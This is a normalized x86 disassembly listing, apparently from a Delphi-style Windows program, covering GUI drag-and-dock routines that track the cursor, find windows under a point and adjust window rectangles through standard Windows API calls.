jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_4439e0
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_443b30
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_443b90
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4031c0
mov edx esp
mov eax esi
call sub_40424c
add esp 0x100
pop esi
pop ebx
retn
sub_443bcc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_443c96
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_444cec
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_444674
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406bf8
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_444674
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_444cec
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_444674
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_444cec
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_443c9b
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_466fa8
call sub_403aa0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_444cec
sub_443cf4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_443d1e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443d84
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443b30
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_443db0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_40346c
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_443ddc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_40346c
xor edx edx
sub_443e34
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_44ec78
sub_443e54
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_44ec60
sub_443e78
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_443d60
mov dl 0x1
mov eax [ r-xdata ]
call sub_423f3c
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_4293e4
mov edx eax
mov eax esi
call sub_4240b8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_443edc
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_443f0c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443d84
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_443f68
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_40346c
pop edi
pop esi
pop ebp
retn 0x4
sub_443f8c
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_443fb0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_443f8c
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_443f8c
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44406c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_4440d8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_444528
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_443644
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_44d054
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_44d054
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_44d054
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_40346c
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_44406c
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_44d054
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_44d054
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_444270
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_44d054
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_44d054
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_4442b4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_443acc
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_4440d8
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_418550
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_44d054
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_444270
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_40346c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_44bb84
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_443a3c
sub_444410
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_4185ac
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_418440
mov edx edi
mov eax [ rw-data ]
call sub_4183f4
jmp r-xdata
sub_444470
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_4444c8
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4044a8
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_443610
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_444528
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4444c8
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_444554
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_4442b4
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_444528
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_444470
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_44d054
mov [ esi ] eax
sub_4445a4
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_444470
cmp eax 0x1
sbb eax eax
inc eax
sub_4445e0
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_44baf0
test eax eax
je r-xdata
mov eax esi
call sub_44baf0
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_445010
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_418550
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4185ac
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_44bb04
mov edi eax
jmp r-xdata
sub_444674
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_444554
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_44eb34
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_4445a4
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_4445a4
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_4462a8
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_4445a4
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464f10
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_44eb1c
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_4445e0
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_40346c
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_44ec1c
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_44eb34
jmp r-xdata
mov eax [ rw-data ]
call sub_44ec90
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464f10
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_4462a8
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_40346c
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_40346c
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407e6c
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_444944
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_443b70
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_44eb34
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_444674
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_444ab4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_444c59
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_40346c
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_40346c
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_443e78
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_444944
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_443d60
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_44d054
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_416eec
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_44627c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_416eec
mov eax [ ebp - 0x8 ]
